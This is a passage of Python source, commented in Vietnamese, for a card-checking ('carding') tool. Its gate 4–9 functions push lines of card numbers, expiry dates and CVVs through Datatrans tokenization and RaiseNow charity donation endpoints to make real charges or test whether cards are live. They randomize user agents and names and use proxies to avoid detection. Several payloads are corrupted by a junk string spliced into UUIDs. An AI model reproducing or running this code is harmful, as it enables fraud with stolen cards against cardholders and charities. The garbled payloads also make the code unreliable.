        payment_headers = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Pragma": "no-cache", "Accept": "*/*", "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Payment: {error}", bin_info
        response_text = payment_response.text
        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
        if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"L?i không xác ð?nh trong Gate 4 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L?i h? th?ng Gate 4: {e}", bin_info

def _check_card_gate5(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 5"""
    try:
        charge_value = _get_charge_value('5', custom_charge_amount)
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250802162822879268", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=mrw5i3faj", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L?i HTTP không có ph?n h?i khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L?i HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph?n h?i Tokenize không ph?i JSON", bin_info
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "ed99e982-2f16-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": charge_value}, "supporter": { "locale": "de", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat4417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}} }, "raisenow_parameters": { "analytics": { "channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,12500,25000]", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" }, "solution": {"uuid": "09f67512-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": "tamaro", "source_url": "https://donate.raisenow.io/dbhrx?lng=de", "uuid": "self-service", "version": "2.16.0" }, "integration": {"donation_receipt_requested": "false"} }, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": { "brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id }, "profile": "5acd9b09-387a-4a89-a090-13b16c4a0032", "return_url": "https://donate.raisenow.io/dbhrx?lng=de&rnw-view=payment_result" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Payment: {error}", bin_info
        response_text = payment_response.text
        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
        if '"payment_status":"succeeded"' in response_text:
            return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text:
            return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text:
            return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text:
            return 'custom', line, response_text, bin_info
        else:
            return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"L?i không xác ð?nh trong Gate 5 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L?i h? th?ng Gate 5: {e}", bin_info

def _check_card_gate6(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 6"""
    try:
        charge_value = _get_charge_value('6', custom_charge_amount)
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250802205541759546", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Pragma": "no-cache", "Accept": "*/*" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L?i HTTP không có ph?n h?i khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L?i HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph?n h?i Tokenize không ph?i JSON", bin_info
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "aa5124b6-2912-4ba1-b8ce-f43915685214", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": charge_value}, "supporter": { "locale": "en", "first_name": "Minh", "last_name": "Nhat", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}} }, "raisenow_parameters": { "analytics": { "channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,10000,15000]", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" }, "solution": {"uuid": "d2c90617-8e65-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV", "source_url": "https://donate.raisenow.io/fxdnk?lng=en", "uuid": "self-service", "version": "2.16.0" }, "integration": {"donation_receipt_requested": "false"} }, "custom_parameters": {"campaign_id": "mindsup", "campaign_subid": ""}, "payment_information": { "brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id }, "profile": "eccfaccc-7730-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Pragma": "no-cache", "Accept": "*/*" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Payment: {error}", bin_info
        response_text = payment_response.text
        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
        if '"payment_status":"succeeded"' in response_text:
            return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text:
            return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text:
            return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text:
            return 'custom', line, response_text, bin_info
        else:
            return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"L?i không xác ð?nh trong Gate 6 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L?i h? th?ng Gate 6: {e}", bin_info

def _check_card_gate7(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 7 - Check Live"""
    try:
        random_first_name = generate_random_name(random.randint(4, 8))
        random_last_name = generate_random_name(random.randint(4, 8))
        random_cardholder = f"{random_first_name} {random_last_name}"
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250802162822879268", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=mrw5i3faj", "X-Requested-With": "XMLHttpRequest", "User-Agent": ua, "Accept": "*/*", "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5", "Cache-Control": "no-cache", "Connection": "keep-alive", "Pragma": "no-cache", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L?i HTTP không có ph?n h?i khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L?i HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph?n h?i Tokenize không ph?i JSON", bin_info
        payment_url = "https://api.raisenow.io/payment-sources"
        payment_payload = { "account_uuid": "ed99e982-2f16-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": 50}, "supporter": { "locale": "de", "first_name": random_first_name, "last_name": random_last_name, "email": "minhnhat4417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}} }, "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,12500,25000]", "user_agent": ua}, "solution": {"uuid": "09f67512-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": "tamaro", "source_url": "https://donate.raisenow.io/dbhrx?lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": { "campaign_id": "", "campaign_subid": ""}, "payment_information": { "brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id }, "profile": "5acd9b09-387a-4a89-a090-13b16c4a0032", "return_url": "https://donate.raisenow.io/dbhrx?lng=de&rnw-view=payment_result" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Pragma": "no-cache", "Accept": "*/*" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Payment Source: {error}", bin_info
        if not payment_response: return 'error', line, "L?i HTTP không có ph?n h?i khi Payment Source", bin_info
        response_text = payment_response.text
        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
        if '"payment_source_status":"pending"' in response_text:
            return 'live_success', line, response_text, bin_info
        else:
            return 'decline', line, response_text, bin_info
    except Exception as e:
        logger.error(f"L?i không xác ð?nh trong Gate 7 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L?i h? th?ng Gate 7: {e}", bin_info

def _check_card_gate8(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 8 - Ch? ð? Charge ho?c Check Live"""
    gate8_mode = get_gate8_mode()
    try:
        random_first_name = generate_random_name(random.randint(4, 8))
        random_last_name = generate_random_name(random.randint(4, 8))
        random_cardholder = f"{random_first_name} {random_last_name}"
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250804202812044270", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField", "X-Requested-With": "XMLHttpRequest", "User-Agent": ua }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L?i HTTP không có ph?n h?i khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L?i HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph?n h?i Tokenize không ph?i JSON", bin_info
        if gate8_mode == 'charge':
            charge_value = _get_charge_value('8', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = { "account_uuid": "ca1e7e48-d2ed-4d3c-aa7e-df7e93582adf", "test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": charge_value}, "supporter": { "locale": "de", "first_name": random_first_name, "last_name": random_last_name, "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}} }, "raisenow_parameters": { "analytics": { "channel": "paylink", "suggested_amounts": [], "user_agent": ua }, "solution": { "uuid": "e0c23079-8884-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVsource_url": "https://donate.raisenow.io/mpnfg?lng=de", "uuid": "self-service", "version": "2.16.0" }, "integration": {"message": "efwwef"} }, "custom_parameters": { "campaign_id": "trauerspende", "campaign_subid": "" }, "payment_information": { "brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id }, "profile": "15e9c847-fead-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV" }
            payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": ua }
            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Payment: {error}", bin_info
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info
        else: # gate8_mode == 'live'
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = { "account_uuid": "ca1e7e48-d2ed-4d3c-aa7e-df7e93582adf", "test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": 50}, "supporter": { "locale": "de", "first_name": random_first_name, "last_name": random_last_name, "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}} }, "raisenow_parameters": { "analytics": { "channel": "paylink", "suggested_amounts": [], "user_agent": ua }, "solution": { "uuid": "e0c23079-8884-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVsource_url": "https://donate.raisenow.io/mpnfg?lng=de", "uuid": "self-service", "version": "2.16.0" }, "integration": {"message": "efwwef"} }, "custom_parameters": { "campaign_id": "trauerspende", "campaign_subid": "" }, "payment_information": { "brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id }, "profile": "15e9c847-fead-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV" }
            payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": ua }
            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Payment Source: {error}", bin_info
            if not payment_response: return 'error', line, "L?i HTTP không có ph?n h?i khi Payment Source", bin_info
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            else: return 'decline', line, response_text, bin_info
    except Exception as e:
        logger.error(f"L?i không xác ð?nh trong Gate 8 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L?i h? th?ng Gate 8: {e}", bin_info

def _check_card_gate9(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 9 - Ch? ð? Charge ho?c Check Live"""
    def random_user_agent():
        chrome_major = random.randint(100, 140)
        chrome_build = random.randint(0, 5999)
        chrome_patch = random.randint(0, 200)
        webkit_major = random.randint(537, 538)
        webkit_minor = random.randint(36, 99)
        safari_version = f"{webkit_major}.{webkit_minor}"
        chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
        win_version = f"10.0; Win64; x64"
        return (f"Mozilla/5.0 (Windows NT {win_version}) AppleWebKit/{safari_version} (KHTML, like Gecko) Chrome/{chrome_version} Safari/{safari_version}")
    def random_string(length=6):
        return ''.join(random.choices(string.ascii_letters, k=length))
    gate9_mode = get_gate9_mode()
    try:
        user_agent = random_user_agent()
        browser_language = random.choice(["vi-VN", "en-US", "fr-FR", "de-DE"])
        first_name = random_string()
        last_name = random_string()
        cardholder_name = f"{first_name} {last_name}"
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250805043713003023", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": user_agent, "browserJavaEnabled": "false", "browserLanguage": browser_language, "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7", "Cache-Control": "no-cache", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Host": "pay.datatrans.com", "Origin": "https://pay.datatrans.com", "Pragma": "no-cache", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField", "User-Agent": user_agent, "X-Requested-With": "XMLHttpRequest" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L?i HTTP không có ph?n h?i khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L?i HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph?n h?i Tokenize không ph?i JSON", bin_info
        payment_headers = { "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7", "Cache-Control": "no-cache", "Content-Type": "application/json", "Host": "api.raisenow.io", "Origin": "https://donate.raisenow.io", "Pragma": "no-cache", "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent }
        base_payload = { "account_uuid": "8376b96a-a35c-4c30-a9ed-cf298f57cdc5", "test_mode": False, "create_supporter": False, "supporter": { "locale": "en", "first_name": first_name, "last_name": last_name, "raisenow_parameters": {"analytics": { "channel": "paylink", "preselected_amount": 2000, "suggested_amounts": [2000, 5000, 10000], "user_agent": user_agent}} }, "solution": {"uuid": "7edeeaf-3394-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVsource_url": "https://donate.raisenow.io/jgcnt?lng=en", "uuid": "self-service", "version": "2.16.0", "integration": {"donation_receipt_requested": "false"} }, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": cardholder_name, "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "de7a9ccb-9e5b-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV" }
        if gate9_mode == 'charge':
            charge_value = _get_charge_value('9', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "CHF", "value": charge_value}
            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Payment: {error}", bin_info
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info
        else: # gate9_mode == 'live'
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "CHF", "value": 50}
            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Payment Source: {error}", bin_info
            if not payment_response: return 'error', line, "L?i HTTP không có ph?n h?i khi Payment Source", bin_info
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            else: return 'decline', line, response_text, bin_info
    except Exception as e:
        logger.error(f"L?i không xác ð?nh trong Gate 9 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L?i h? th?ng Gate 9: {e}", bin_info

def check_card(line, cancellation_event=None, custom_charge_amount=None):
    if cancellation_event and cancellation_event.is_set():
        return 'cancelled', line, 'User cancelled', {}
    parts = line.strip().split('|')
    cc, mes, ano, cvv = "", "", "", ""
    if len(parts) == 4:
        cc, mes, ano, cvv = [p.strip() for p in parts]
    elif len(parts) == 3:
        cc_part, date_part, cvv_part = [p.strip() for p in parts]
        if '/' in date_part:
            date_split = date_part.split('/')
            if len(date_split) == 2:
                cc, mes, ano, cvv = cc_part.strip(), date_split[0].strip(), date_split[1].strip(), cvv_part.strip()
            else:
                return 'invalid_format', line, "Ð?nh d?ng ngày tháng không h?p l? (mm/yy ho?c mm/yyyy).", {}
        else:
            return 'invalid_format', line, "Thi?u d?u '/' trong ph?n ngày tháng.", {}
    else:
        return 'invalid_format', line, "Ð?nh d?ng không h?p l? (cc|mm|yy|cvv ho?c cc|mm/yy|cvv).", {}
    is_valid, error_message = validate_card_format(cc, mes, ano, cvv)
    if not is_valid:
        return 'invalid_format', line, error_message, {}
    try:
        year_str = ano.strip()
        if len(year_str) == 2:
            full_year = int(f"20{year_str}")
        elif len(year_str) == 4:
            full_year = int(year_str)
        else:
            full_year = 0
        if full_year < datetime.now().year:
            return 'decline', line, 'EXPIRED_CARD_DECLINE', {}
    except ValueError:
        return 'invalid_format', line, "Nãm h?t h?n không h?p l?.", {}
    if len(ano) == 2: ano = f"20{ano}"
    session = requests.Session()
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    session.headers.update({"User-Agent": ua})
    proxy_config = load_proxies()
    if proxy_config.get("enabled") and proxy_config.get("proxies"):
        try:
